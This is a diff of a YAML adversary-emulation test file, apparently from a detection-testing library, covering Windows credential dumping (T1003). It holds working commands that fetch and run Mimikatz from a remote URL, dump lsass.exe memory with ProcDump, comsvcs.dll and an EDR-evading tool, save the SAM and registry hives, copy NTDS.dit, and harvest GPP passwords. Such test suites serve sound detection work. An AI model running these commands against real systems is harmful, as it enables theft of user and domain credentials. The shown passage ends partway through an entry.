@@ -1,98 +1,68 @@
----
-attack_technique: T1003
-display_name: Credential Dumping
-
+attack_technique:
+- T1003
+display_name: OS Credential Dumping
 atomic_tests:
 - name: Powershell Mimikatz
-  auto_generated_guid: 66fb0bc1-3c3f-47e9-a298-550ecfefacbc
-  description: |
-    Dumps credentials from memory via Powershell by invoking a remote mimikatz script.
-
-    If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
-
-    Common failures include seeing an "access denied" error which results when Anti-Virus blocks execution. 
-    Or, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen "ERROR kuhl_m_sekurlsa_acquireLSA"
-
+  description: "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\n\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\n\nCommon failures include seeing an \"access denied\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n"
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     remote_script:
       description: URL to a remote Mimikatz script that dumps credentials
       type: Url
       default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1
   executor:
-    name: powershell
-    elevation_required: true
     command: |
       IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
-
+    name: powershell
+    elevation_required: true
 - name: Gsecdump
-  auto_generated_guid: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
-  description: |
-    Dump credentials from memory using Gsecdump.
-
-    Upon successful execution, you should see domain\username's following by two 32 characters hashes.
-
-    If you see output that says "compat: error: failed to create child process", execution was likely blocked by Anti-Virus. 
-    You will receive only error output if you do not run this test from an elevated context (run as administrator)
-
-    If you see a message saying "The system cannot find the path specified", try using the get-prereq_commands to download and install Gsecdump first.
-
+  description: "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's following by two 32 characters hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n"
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     gsecdump_exe:
       description: Path to the Gsecdump executable
       type: Path
       default: PathToAtomicsFolder\T1003\bin\gsecdump.exe
-    gsecdump_url:
-      description: Path to download Gsecdump binary file
-      type: url
-      default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
     gsecdump_bin_hash:
       description: File hash of the Gsecdump binary file
       type: String
       default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
-
+    gsecdump_url:
+      description: Path to download Gsecdump binary file
+      type: url
+      default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        Gsecdump must exist on disk at specified location (#{gsecdump_exe})
-      prereq_command: |
-        if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
-        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){
-          Move-Item $binpath "#{gsecdump_exe}"
-        }
-
+  - description: |
+      Gsecdump must exist on disk at specified location (#{gsecdump_exe})
+    prereq_command: |
+      if (Test-Path #{gsecdump_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){
+        Move-Item $binpath "#{gsecdump_exe}"
+      }
   executor:
-    name: command_prompt
-    elevation_required: true
     command: |
       #{gsecdump_exe} -a
-
+    name: command_prompt
+    elevation_required: true
 - name: Windows Credential Editor
-  auto_generated_guid: 0f7c5301-6859-45ba-8b4d-1fac30fc31ed
-  description: |
-    Dump user credentials using Windows Credential Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)
-
-    Upon successful execution, you should see a file with user passwords/hashes at %temp%/wce-output.file.
-
-    If you see no output it is likely that execution was blocked by Anti-Virus. 
-
-    If you see a message saying "wce.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install Windows Credential Editor first.
-    
+  description: "Dump user credentials using Windows Credential Editor (supports Windows XP, 2003, Vista, 7, 2008 and Windows 8 only)\n\nUpon successful execution, you should see a file with user passwords/hashes at %temp%/wce-output.file.\n\nIf you see no output it is likely that execution was blocked by Anti-Virus. \n\nIf you see a message saying \"wce.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install Windows Credential Editor first.\n"
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     output_file:
       description: Path where resulting data should be placed
       type: Path
-      default: "%temp%\\wce-output.txt"
+      default: '%temp%\wce-output.txt'
+    wce_zip_hash:
+      description: File hash of the Windows Credential Editor zip file
+      type: String
+      default: 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933
     wce_exe:
       description: Path of Windows Credential Editor executable
       type: Path
@@ -101,48 +71,35 @@ atomic_tests:
       description: Path to download Windows Credential Editor zip file
       type: url
       default: https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
-    wce_zip_hash:
-      description: File hash of the Windows Credential Editor zip file
-      type: String
-      default: 8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933
-
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        Windows Credential Editor must exist on disk at specified location (#{wce_exe})
-      prereq_command: |
-        if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
-        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
-        if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
-          Expand-Archive $zippath $parentpath\wce -Force
-          Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
-          Remove-Item $zippath, $parentpath\wce -Recurse
-        }
-
+  - description: |
+      Windows Credential Editor must exist on disk at specified location (#{wce_exe})
+    prereq_command: |
+      if (Test-Path #{wce_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      $parentpath = Split-Path "#{wce_exe}"; $zippath = "$parentpath\wce.zip"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")
+      if(Invoke-WebRequestVerifyHash "#{wce_url}" "$zippath" #{wce_zip_hash}){
+        Expand-Archive $zippath $parentpath\wce -Force
+        Move-Item $parentpath\wce\wce.exe "#{wce_exe}"
+        Remove-Item $zippath, $parentpath\wce -Recurse
+      }
   executor:
-    name: command_prompt
-    elevation_required: true
     command: |
       #{wce_exe} -o #{output_file}
-    cleanup_command:
-      del "#{output_file}" >nul 2>&1
-
+    cleanup_command: del "#{output_file}" >nul 2>&1
+    name: command_prompt
+    elevation_required: true
 - name: Registry dump of SAM, creds, and secrets
-  auto_generated_guid: 5c2571d0-1572-416d-9676-812e64ca9f44
   description: |
     Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
     via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
 
     Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
-
   supported_platforms:
-    - windows
-
+  - windows
   executor:
-    name: command_prompt
-    elevation_required: true
     command: |
       reg save HKLM\sam %temp%\sam
       reg save HKLM\system %temp%\system
@@ -151,9 +108,9 @@ atomic_tests:
       del %temp%\sam >nul 2> nul
       del %temp%\system >nul 2> nul
       del %temp%\security >nul 2> nul
-
+    name: command_prompt
+    elevation_required: true
 - name: Dump LSASS.exe Memory using ProcDump
-  auto_generated_guid: 0be2230c-9ab3-4ac2-8826-3199b9a0ebf8
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
     ProcDump.
@@ -162,8 +119,7 @@ atomic_tests:
 
     If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     output_file:
       description: Path where resulting dump should be placed
@@ -173,90 +129,70 @@ atomic_tests:
       description: Path of Procdump executable
       type: Path
       default: PathToAtomicsFolder\T1003\bin\procdump.exe
-
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
-      prereq_command: |
-        if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
-        Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
-        New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
-        Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
-
+  - description: |
+      ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})
+    prereq_command: |
+      if (Test-Path #{procdump_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://download.sysinternals.com/files/Procdump.zip" -OutFile "$env:TEMP\Procdump.zip"
+      Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
+      New-Item -ItemType Directory (Split-Path #{procdump_exe}) -Force | Out-Null
+      Copy-Item $env:TEMP\Procdump\Procdump.exe #{procdump_exe} -Force
   executor:
-    elevation_required: true
-    name: command_prompt
     command: |
       #{procdump_exe} -accepteula -ma lsass.exe #{output_file}
     cleanup_command: |
       del "#{output_file}" >nul 2> nul
-
+    name: command_prompt
+    elevation_required: true
 - name: Dump LSASS.exe Memory using comsvcs.dll
-  auto_generated_guid: 2536dee2-12fb-459a-8c37-971844fa73be
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.
 
     Upon successful execution, you should see the following file created $env:TEMP\lsass-comsvcs.dmp.
-
   supported_platforms:
-    - windows
-
+  - windows
   executor:
-    elevation_required: true
-    name: powershell
     command: |
       C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
     cleanup_command: |
       Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
-
+    name: powershell
+    elevation_required: true
 - name: Dump LSASS.exe Memory using direct system calls and API unhooking
-  auto_generated_guid: 7ae7102c-a099-45c8-b985-4c7a2d05790d
-  description: |
-    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. 
-    https://github.com/outflanknl/Dumpert
-    https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/
-    Upon successful execution, you should see the following file created C:\windows\temp\dumpert.dmp.
-
-    If you see a message saying "The system cannot find the path specified.", try using the  get-prereq_commands to download the  tool first.
+  description: "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\windows\\temp\\dumpert.dmp.\n\nIf you see a message saying \"The system cannot find the path specified.\", try using the  get-prereq_commands to download the  tool first.\n"
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     dumpert_exe:
       description: Path of Dumpert executable
       type: Path
       default: PathToAtomicsFolder\T1003\bin\Outflank-Dumpert.exe
-
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        Dumpert executable must exist on disk at specified location (#{dumpert_exe})
-      prereq_command: |
-        if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null
-        Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile #{dumpert_exe}
-
+  - description: |
+      Dumpert executable must exist on disk at specified location (#{dumpert_exe})
+    prereq_command: |
+      if (Test-Path #{dumpert_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -ItemType Directory (Split-Path #{dumpert_exe}) -Force | Out-Null
+      Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile #{dumpert_exe}
   executor:
-    elevation_required: true
-    name: command_prompt
     command: |
       #{dumpert_exe}
     cleanup_command: |
       del C:\windows\temp\dumpert.dmp >nul 2> nul
-
+    name: command_prompt
+    elevation_required: true
 - name: Dump LSASS.exe Memory using Windows Task Manager
-  auto_generated_guid: dea6c349-f1c6-44f3-87a1-1ed33a59a607
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task
     Manager and administrative permissions.
   supported_platforms:
-    - windows
+  - windows
   executor:
-    name: manual
     steps: |
       1. Open Task Manager:
         On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking
@@ -268,48 +204,45 @@ atomic_tests:
 
       3. Dump lsass.exe memory:
         Right-click on lsass.exe in Task Manager. Select "Create Dump File". The following dialog will show you the path to the saved file.
-
+    name: manual
 - name: Offline Credential Theft With Mimikatz
-  auto_generated_guid: 453acf13-1dbd-47d7-b28a-172ce9228023
   description: |
     The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with
     Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
-    mimikatz_exe:
-      description: Path of the Mimikatz binary
-      type: string
-      default: PathToAtomicsFolder\T1003\bin\mimikatz.exe
     input_file:
       description: Path of the Lsass dump
       type: Path
       default: '%tmp%\lsass.DMP'
+    mimikatz_exe:
+      description: Path of the Mimikatz binary
+      type: string
+      default: PathToAtomicsFolder\T1003\bin\mimikatz.exe
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        Mimikatz must exist on disk at specified location (#{mimikatz_exe})
-      prereq_command: |
-        if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
-      get_prereq_command: |
-        Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
-        Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
-        New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
-        Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
-    - description: |
-        Lsass dump must exist at specified location (#{input_file})
-      prereq_command: |
-        cmd /c "if not exist #{input_file} (exit /b 1)"
-      get_prereq_command: |
-        Write-Host "Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
+  - description: |
+      Mimikatz must exist on disk at specified location (#{mimikatz_exe})
+    prereq_command: |
+      if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+      Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
+      New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
+      Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
+  - description: |
+      Lsass dump must exist at specified location (#{input_file})
+    prereq_command: |
+      cmd /c "if not exist #{input_file} (exit /b 1)"
+    get_prereq_command: |
+      Write-Host "Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)"
   executor:
-    name: command_prompt
-    elevation_required: true
     command: |
       #{mimikatz_exe} "sekurlsa::minidump #{input_file}" "sekurlsa::logonpasswords full" exit
-
+    name: command_prompt
+    elevation_required: true
 - name: Dump Active Directory Database with NTDSUtil
-  auto_generated_guid: 2364e33d-ceab-4641-8468-bfb1d7cc2723
   description: |
     This test is intended to be run on a domain Controller.
 
@@ -318,106 +251,82 @@ atomic_tests:
     subsequent domain controllers without the need of network-based replication.
 
     Upon successful completion, you will find a copy of the ntds.dit file in the C:\Windows\Temp directory.
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     output_folder:
       description: Path where resulting dump should be placed
       type: Path
       default: C:\Windows\Temp
-
   dependencies:
-    - description: |
-        Target must be a Domain Controller
-      prereq_command: |
-        reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
-      get_prereq_command: |
-        echo Sorry, Promoting this machine to a Domain Controller must be done manually
-
+  - description: |
+      Target must be a Domain Controller
+    prereq_command: |
+      reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
+    get_prereq_command: |
+      echo Sorry, Promoting this machine to a Domain Controller must be done manually
   executor:
-    name: command_prompt
-    elevation_required: true
     command: |
       ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
-
+    name: command_prompt
+    elevation_required: true
 - name: Create Volume Shadow Copy with NTDS.dit
-  auto_generated_guid: dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f
   description: |
     This test is intended to be run on a domain Controller.
-    
+
     The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     drive_letter:
       description: Drive letter to source VSC (including colon)
       type: String
-      default: "C:"
-
+      default: 'C:'
   dependencies:
-    - description: |
-        Target must be a Domain Controller
-      prereq_command: |
-        reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
-      get_prereq_command: |
-        echo Sorry, Promoting this machine to a Domain Controller must be done manually
-
+  - description: |
+      Target must be a Domain Controller
+    prereq_command: |
+      reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
+    get_prereq_command: |
+      echo Sorry, Promoting this machine to a Domain Controller must be done manually
   executor:
-    name: command_prompt
-    elevation_required: true
     command: |
       vssadmin.exe create shadow /for=#{drive_letter}
-
+    name: command_prompt
+    elevation_required: true
 - name: Copy NTDS.dit from Volume Shadow Copy
-  auto_generated_guid: c6237146-9ea6-4711-85c9-c56d263a6b03
-  description: |
-    This test is intended to be run on a domain Controller.
-
-    The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
-
-    This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
-    A successful test also requires the export of the SYSTEM Registry hive. 
-    This test must be executed on a Windows Domain Controller.
+  description: "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test \"Create Volume Shadow Copy with NTDS.dit\".\nA successful test also requires the export of the SYSTEM Registry hive. \nThis test must be executed on a Windows Domain Controller.\n"
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
     vsc_name:
       description: Name of Volume Shadow Copy
       type: String
-      default: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+      default: '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1'
     extract_path:
       description: Path for extracted NTDS.dit
       type: Path
       default: C:\Windows\Temp
-
   dependencies:
-    - description: |
-        Target must be a Domain Controller
-      prereq_command: |
-        reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
-      get_prereq_command: |
-        echo Sorry, Promoting this machine to a Domain Controller must be done manually
-    - description: |
-        Volume shadow copy must exist
-      prereq_command: |
-        if not exist #{vsc_name} (exit /b 1)
-      get_prereq_command: |
-        echo Run "Invoke-AtomicTest T1003 -TestName 'Create Volume Shadow Copy with NTDS.dit'" to fulfuill this requirement
-    - description: |
-        Extract path must exist
-      prereq_command: |
-        if not exist #{extract_path} (exit /b 1)
-      get_prereq_command: |
-        mkdir #{extract_path}
-      
+  - description: |
+      Target must be a Domain Controller
+    prereq_command: |
+      reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT
+    get_prereq_command: |
+      echo Sorry, Promoting this machine to a Domain Controller must be done manually
+  - description: |
+      Volume shadow copy must exist
+    prereq_command: |
+      if not exist #{vsc_name} (exit /b 1)
+    get_prereq_command: |
+      echo Run "Invoke-AtomicTest T1003 -TestName 'Create Volume Shadow Copy with NTDS.dit'" to fulfuill this requirement
+  - description: |
+      Extract path must exist
+    prereq_command: |
+      if not exist #{extract_path} (exit /b 1)
+    get_prereq_command: |
+      mkdir #{extract_path}
   executor:
-    name: command_prompt
-    elevation_required: true
     command: |
       copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
       copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
@@ -426,184 +335,150 @@ atomic_tests:
       del "#{extract_path}\ntds.dit"        >nul 2> nul
       del "#{extract_path}\VSC_SYSTEM_HIVE" >nul 2> nul
       del "#{extract_path}\SYSTEM_HIVE"     >nul 2> nul
-
+    name: command_prompt
+    elevation_required: true
 - name: GPP Passwords (findstr)
-  auto_generated_guid: 870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f
   description: |
     Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
-
   supported_platforms:
-    - windows
-
+  - windows
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        Computer must be domain joined
-      prereq_command: |
-        if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
-      get_prereq_command: |
-        Write-Host Joining this computer to a domain must be done manually
-
+  - description: |
+      Computer must be domain joined
+    prereq_command: |
+      if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host Joining this computer to a domain must be done manually
   executor:
-    name: command_prompt
-    elevation_required: false
     command: |
       findstr /S cpassword %logonserver%\sysvol\*.xml
-
+    name: command_prompt
 - name: GPP Passwords (Get-GPPPassword)
-  auto_generated_guid: e9584f82-322c-474a-b831-940fd8b4455c
   description: |
     Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.
     This test is intended to be run from a domain joined workstation, not on the Domain Controller itself.
     The Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.
 
     Successful test execution will either display the credentials found in the GPP files or indicate "No preference files found".
-
   supported_platforms:
-    - windows
-
+  - windows
   input_arguments:
-    gpp_script_path:
-      description: Path to the Get-GPPPassword PowerShell Script
-      type: Path
-      default: PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
     gpp_script_url:
       description: URL of the Get-GPPPassword PowerShell Script
       type: url
       default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
-
+    gpp_script_path:
+      description: Path to the Get-GPPPassword PowerShell Script
+      type: Path
+      default: PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
   dependency_executor_name: powershell
   dependencies:
-    - description: |
-        Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
-      prereq_command: |
-        if(Test-Path "#{gpp_script_path}") {exit 0 } else {exit 1 }
-      get_prereq_command: |
-        New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
-        Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
-    - description: |
-        Computer must be domain joined
-      prereq_command: |
-        if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
-      get_prereq_command: |
-        Write-Host Joining this computer to a domain must be done manually
-
+  - description: |
+      Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
+    prereq_command: |
+      if(Test-Path "#{gpp_script_path}") {exit 0 } else {exit 1 }
+    get_prereq_command: |
+      New-Item -ItemType Directory (Split-Path "#{gpp_script_path}") -Force | Out-Null
+      Invoke-WebRequest #{gpp_script_url} -OutFile "#{gpp_script_path}"
+  - description: |
+      Computer must be domain joined
+    prereq_command: |
+      if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host Joining this computer to a domain must be done manually
   executor:
-    name: powershell
-    elevation_required: false
     command: |
       . #{gpp_script_path}
       Get-GPPPassword -Verbose
-
+    name: powershell
 - name: LSASS read with pypykatz
-  auto_generated_guid: c37bc535-5c62-4195-9cc3-0517673171d8
-  description: |
-    Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::
-
-    Python 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.
-
-    Successful execution of this test will display multiple useranames and passwords/hashes to the screen.
-      
+  description: "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple useranames and passwords/hashes to the screen.\n  \n"
   supported_platforms:
-    - windows
-  
+  - windows
   dependency_executor_name: powershell
-  
   dependencies:
-    - description: |
-        Computer must have python 3 installed
-      prereq_command: |
-        if (python --version) {exit 0} else {exit 1}
-      get_prereq_command: |
-        echo "Python 3 must be installed manually"
-    - description: |
-        Computer must have pip installed
-      prereq_command: |
-        if (pip3 -V) {exit 0} else {exit 1}
-      get_prereq_command: |
-        echo "PIP must be installed manually"
-    - description: |
-        pypykatz must be installed and part of PATH
-      prereq_command: |
-        if (cmd /c pypykatz -h) {exit 0} else {exit 1}
-      get_prereq_command: |
-        pip3 install pypykatz
-    
+  - description: |
+      Computer must have python 3 installed
+    prereq_command: |
+      if (python --version) {exit 0} else {exit 1}
+    get_prereq_command: |
+      echo "Python 3 must be installed manually"
+  - description: |
+      Computer must have pip installed
+    prereq_command: |
+      if (pip3 -V) {exit 0} else {exit 1}
+    get_prereq_command: |
+      echo "PIP must be installed manually"
+  - description: |
+      pypykatz must be installed and part of PATH
+    prereq_command: |
+      if (cmd /c pypykatz -h) {exit 0} else {exit 1}
+    get_prereq_command: |
+      pip3 install pypykatz
   executor:
-    name: command_prompt
-    elevation_required: true
     command: |
       pypykatz live lsa
-
-- name: Registry parse with pypykatz
-  auto_generated_guid: a96872b2-cbf3-46cf-8eb4-27e8c0e85263
-  description: |
-    Parses registry hives to obtain stored credentials
-    
-  supported_platforms:
-    - windows
-  
-  dependency_executor_name: powershell
-  
-  dependencies:
-    - description: |
-        Computer must have python 3 installed
-      prereq_command: |
-        if (python --version) {exit 0} else {exit 1}
-      get_prereq_command: |
-        echo "Python 3 must be installed manually"
-    - description: |
-        Computer must have pip installed
-      prereq_command: |
-        if (pip3 -V) {exit 0} else {exit 1}
-      get_prereq_command: |
-        echo "PIP must be installed manually"
-    - description: |
-        pypykatz must be installed and part of PATH
-      prereq_command: |
-        if (cmd /c pypykatz -h) {exit 0} else {exit 1}
-      get_prereq_command: |
-        pip3 install pypykatz
-
-  executor:
     name: command_prompt
     elevation_required: true
+- name: Registry parse with pypykatz
+  description: |
+    Parses registry hives to obtain stored credentials
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Computer must have python 3 installed
+    prereq_command: |
+      if (python --version) {exit 0} else {exit 1}
+    get_prereq_command: |
+      echo "Python 3 must be installed manually"
+  - description: |
+      Computer must have pip installed
+    prereq_command: |
+      if (pip3 -V) {exit 0} else {exit 1}
+    get_prereq_command: |
+      echo "PIP must be installed manually"
+  - description: |
+      pypykatz must be installed and part of PATH
+    prereq_command: |
+      if (cmd /c pypykatz -h) {exit 0} else {exit 1}
+    get_prereq_command: |
+      pip3 install pypykatz
+  executor:
     command: |
       pypykatz live registry
-
+    name: command_prompt
+    elevation_required: true
 - name: Run Chrome-password Collector
-  auto_generated_guid: 8c05b133-d438-47ca-a630-19cc464c4622
   description: |
     A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.
 
     Successful execution will produce stdout message stating "Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly". Upon completion, final output will be a file modification of $env:TEMP\sysinternals\passwordsdb.
-    
+
     Adapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)
   supported_platforms:
-    - windows
+  - windows
   input_arguments:
     file_path:
       description: File path for modified Sysinternals
       type: String
